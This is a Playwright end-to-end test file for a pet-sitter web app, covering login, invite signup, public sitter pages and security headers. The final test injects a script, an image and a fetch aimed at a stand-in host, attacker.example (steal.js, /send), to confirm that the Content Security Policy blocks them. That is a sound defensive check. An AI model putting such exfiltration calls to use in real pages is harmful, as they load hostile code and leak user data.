import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { Browser } from 'playwright'
import { APP, fakeSupabase, json, launch, openPhone } from './browser.ts'

// What someone sees before logging in, on a phone. Supabase is a stand-in (see browser.ts).
let browser: Browser
beforeAll(async () => {
  browser = await launch()
})
afterAll(async () => {
  await browser?.close()
})

describe('Welcome', () => {
  it('opens on Sign up, fits a phone screen, and has no errors', async () => {
    const { page, problems } = await openPhone(browser)
    await fakeSupabase(page, {})
    await page.goto(APP)
    await expect(page.getByRole('heading', { name: 'Find a pet sitter your friends already trust' }).isVisible()).resolves.toBe(true)
    await expect(page.getByRole('button', { name: 'Create profile' }).isVisible()).resolves.toBe(true)
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)
    expect(overflow).toBe(0)
    expect(problems).toEqual([])
  })

  it('fills in the code from an invite link', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {})
    await page.goto(`${APP}/?invite=LUNA42`)
    await expect(page.getByLabel('Invitation code (optional)').inputValue()).resolves.toBe('LUNA42')
  })
})

describe('Log in', () => {
  it('explains a wrong password in plain words', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {
      'POST /auth/v1/token': json(400, { code: 'invalid_credentials', message: 'Invalid login credentials' }),
    })
    await page.goto(APP)
    await page.getByRole('button', { name: 'Log in' }).click()
    await page.getByLabel('Email').fill('alice@example.com')
    await page.getByLabel('Password', { exact: true }).fill('not-my-password')
    await page.getByRole('button', { name: 'Log in' }).click()
    await page.getByText('That email and password don’t match').waitFor()
  })

  it('“Forgot your password?” never says whether an email has a profile', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, { 'POST /auth/v1/recover': json(200, {}) })
    await page.goto(APP)
    await page.getByRole('button', { name: 'Log in' }).click()
    await page.getByLabel('Email').fill('nobody@example.com')
    await page.getByRole('button', { name: 'Forgot your password?' }).click()
    await page.getByRole('button', { name: /send/i }).click()
    await page.getByText('If there’s a profile for nobody@example.com').waitFor()
  })
})

describe('Sign up', () => {
  it('stops at a mistyped invitation code, before creating anything', async () => {
    const { page } = await openPhone(browser)
    const calls = await fakeSupabase(page, { 'POST /rest/v1/rpc/is_invite_code_valid': json(200, false) })
    await page.goto(APP)
    await page.getByLabel('Email').fill('new@example.com')
    await page.getByLabel('Password', { exact: true }).fill('a-long-password')
    await page.getByLabel('Invitation code (optional)').fill('TYPO')
    await page.getByRole('button', { name: 'Create profile' }).click()
    await page.getByText('That invitation code doesn’t work').waitFor()
    expect(calls).not.toContain('POST /auth/v1/signup')
  })
})

// A pet sitter's link, opened by someone without an account (database script 20)
const daniPage = {
  id: 'da1da1da-0000-4000-8000-000000000003',
  first_name: 'Dani',
  avatar_url: null,
  city: 'Málaga',
  bio: 'Dog walker',
  sitter: {
    offers: ['dog_walking'], available_from: null, available_until: null, area: 'Centro', radius_km: 5, travels: true,
    daily_rate: '20', overnight_rate: null, walk_rate: '9.5', stay_for_care: false, sitting_exchange: false,
  },
  recommendations: [{ first_name: 'Anna', avatar_url: null, note: 'Walked Rocky every day for a month', created_at: new Date().toISOString() }],
  recommend_count: 1,
}

describe('A pet sitter’s link', () => {
  it('shows their public page: what they offer and who recommends them, nothing private', async () => {
    const { page, problems } = await openPhone(browser)
    await fakeSupabase(page, { 'POST /rest/v1/rpc/public_sitter_page': json(200, daniPage) })
    await page.goto(`${APP}/?sitter=d4n1c0de99`)
    await page.getByRole('button', { name: 'Contact Dani' }).waitFor()
    const body = await page.locator('body').innerText()
    expect(body).toContain('Recommended by Anna')
    expect(body).toContain('Walked Rocky every day for a month')
    expect(body).toContain('Dog walking')
    expect(body).not.toMatch(/Dani’s pets|Your pets|What’s new/)
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)
    expect(overflow).toBe(0)
    expect(problems).toEqual([])
  })

  it('works as an invite: sign up with no code, and the email brings you back to recommend Dani', async () => {
    const { page } = await openPhone(browser)
    let signUp: { url: string; body: { data?: Record<string, unknown> } } | null = null
    const calls = await fakeSupabase(page, {
      'POST /rest/v1/rpc/public_sitter_page': json(200, daniPage),
      'POST /auth/v1/signup': (route, url) => {
        signUp = { url: url.toString(), body: route.request().postDataJSON() }
        return route.fulfill({
          status: 200,
          headers: { 'Access-Control-Allow-Origin': '*' },
          json: { id: 'new-user', aud: 'authenticated', role: 'authenticated', email: 'friend@example.com', identities: [{ id: 'x' }], created_at: new Date().toISOString() },
        })
      },
    })
    await page.goto(`${APP}/?sitter=d4n1c0de99`)
    await page.getByRole('button', { name: 'I’ve used Dani, recommend' }).click()
    await page.getByRole('heading', { name: 'Sign up to recommend Dani' }).waitFor()
    await expect(page.getByLabel('Invitation code (optional)').count()).resolves.toBe(0)
    await page.getByLabel('Email').fill('friend@example.com')
    await page.getByLabel('Password', { exact: true }).fill('a-long-password')
    await page.getByRole('button', { name: 'Create profile' }).click()
    await page.getByText('Check your inbox').waitFor()
    expect(calls).not.toContain('POST /rest/v1/rpc/is_invite_code_valid')
    expect(signUp!.body.data?.invite_code).toBeUndefined() // no code: nobody's circle
    expect(decodeURIComponent(signUp!.url)).toContain('/?sitter=d4n1c0de99&do=recommend')
    const remembered = await page.evaluate(() => localStorage.getItem('homami:sitter-link'))
    expect(JSON.parse(remembered!)).toEqual({ code: 'd4n1c0de99', intent: 'recommend' })
  })

  it('says so when the link doesn’t work', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, { 'POST /rest/v1/rpc/public_sitter_page': json(200, null) })
    await page.goto(`${APP}/?sitter=nothing123`)
    await page.getByText('This link doesn’t work any more').waitFor()
  })
})

describe('Browser safety settings (vercel.json)', () => {
  it('sends them with every page', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {})
    const response = await page.goto(APP)
    const headers = response!.headers()
    expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
    expect(headers['x-frame-options']).toBe('DENY')
    expect(headers['x-content-type-options']).toBe('nosniff')
  })

  it('blocks scripts, images and requests to other websites', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {})
    await page.goto(APP)
    const blocked = await page.evaluate(async () => {
      const seen: string[] = []
      document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective.replace(/-elem$/, '')))
      const s = document.createElement('script')
      s.src = 'https://attacker.example/steal.js'
      document.head.append(s)
      new Image().src = 'https://attacker.example/pixel.gif'
      await fetch('https://attacker.example/send').catch(() => null)
      await new Promise((r) => setTimeout(r, 500))
      return seen.sort()
    })
    expect(blocked).toEqual(['connect-src', 'img-src', 'script-src'])
  })
})
